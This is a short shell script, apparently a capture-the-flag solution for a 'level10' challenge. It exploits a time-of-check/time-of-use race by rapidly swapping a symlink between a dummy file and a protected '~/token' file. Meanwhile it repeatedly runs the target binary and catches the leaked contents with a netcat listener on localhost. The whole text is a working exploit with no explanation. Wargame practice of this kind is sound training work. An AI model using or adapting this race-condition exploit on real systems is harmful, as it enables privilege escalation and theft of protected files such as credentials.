echo '.*( )*.' > /tmp/swap

(while true; do nc -l 6969 | tr -d '.*( )*.'; done)&

(for (( ; ;))
do
        ~/level10 /tmp/toto 127.0.0.1 &> /dev/null
done;)&

for (( ; ; ))
do
        ln -fs /tmp/swap /tmp/toto;
        ln -fs ~/token /tmp/toto;
done;

